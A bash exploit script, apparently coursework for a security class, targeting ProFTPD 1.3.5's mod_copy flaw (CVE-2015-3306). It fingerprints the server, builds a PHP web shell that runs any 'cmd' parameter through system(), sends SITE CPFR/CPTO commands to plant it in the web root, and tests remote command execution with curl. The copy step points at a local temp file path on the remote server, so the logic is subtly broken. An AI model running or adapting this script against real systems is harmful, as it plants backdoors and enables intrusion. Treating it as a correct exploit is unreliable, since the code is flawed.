#!/bin/bash

if [ $# -lt 2 ]; then
    echo "Usage: $0 <target_ip> <attacker_ip>"
    exit 1
fi

TARGET_IP=$1
ATTACKER_IP=$2
PORT=${3:-21}
WEB_PATH=${4:-"/var/www/html"}

echo "[*] ICS344 ProFTPD Exploitation Script"
echo "[*] Target: $TARGET_IP:$PORT | Attacker: $ATTACKER_IP"

echo "[*] Checking FTP service..."
if ! nmap -p $PORT -T4 --open $TARGET_IP | grep -q "open"; then
    echo "[-] FTP service not found on target"
    exit 1
fi

echo "[*] Getting FTP banner..."
banner=$(echo -e "QUIT\r\n" | nc -w 3 $TARGET_IP $PORT 2>/dev/null | head -1)
echo "[+] Banner: $banner"

if echo "$banner" | grep -qi "ProFTPD 1.3.5"; then
    echo "[+] Target appears to be running ProFTPD 1.3.5"
    echo "[+] Service may be vulnerable to mod_copy module exploitation (CVE-2015-3306)"
else
    echo "[!] Target does not appear to be running ProFTPD 1.3.5"
    echo "[!] Continuing anyway for demonstration purposes"
fi

echo "[*] Creating payload..."
SHELL_CODE=$(
    cat <<'EOF'
<?php
  if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
  }
?>
EOF
)

echo "[*] Preparing payload file..."
PAYLOAD_FILE=$(mktemp)
echo "$SHELL_CODE" >$PAYLOAD_FILE
echo "[+] Payload created in $PAYLOAD_FILE"

SHELL_NAME="shell_$(date +%s).php"
echo "[*] Target shell name: $SHELL_NAME"

echo "[*] Setting up exploit..."
echo "[*] Target web directory: $WEB_PATH"

echo "[*] Sending exploit commands..."
(
    echo "SITE CPFR $PAYLOAD_FILE"
    sleep 1
    echo "SITE CPTO $WEB_PATH/$SHELL_NAME"
    sleep 1
    echo "QUIT"
) | nc -w 10 $TARGET_IP $PORT

rm $PAYLOAD_FILE
echo "[+] Local temporary file removed"

echo "[*] Verifying shell upload..."
if curl -s "http://$TARGET_IP/$SHELL_NAME" | grep -q "cmd"; then
    echo "[+] Shell successfully uploaded to http://$TARGET_IP/$SHELL_NAME"

    echo "[*] Testing remote command execution..."
    TEST_OUTPUT=$(curl -s "http://$TARGET_IP/$SHELL_NAME?cmd=id")

    if echo "$TEST_OUTPUT" | grep -q "uid="; then
        echo "[+] Command execution successful!"
        echo "[+] Example output:"
        echo "$TEST_OUTPUT" | grep -m3 "uid="
    else
        echo "[-] Command execution failed or had unexpected output"
    fi

    echo "[+] You can now manually access the shell at: http://$TARGET_IP/$SHELL_NAME?cmd=COMMAND"
else
    echo "[-] Shell upload appears to have failed"
    echo "[!] This could be due to permission issues or incorrect web path"
fi

echo "[+] Exploitation demonstration completed"
echo "[+] PROOF OF CONCEPT:"
echo "--------------------------------------"
echo "| Vulnerability: ProFTPD 1.3.5 mod_copy |"
echo "| Target: $TARGET_IP:$PORT                |"
echo "| Service: ProFTPD 1.3.5                 |"
echo "| Attack: mod_copy module exploitation   |"
echo "| Status: Exploitation Demonstrated      |"
echo "--------------------------------------"

echo "[!] IMPORTANT: This script is for educational purposes only"
echo "[!] Use only in authorized environments as part of ICS344 coursework"
echo "[!] Remember to remove uploaded shells when testing is complete"

exit 0
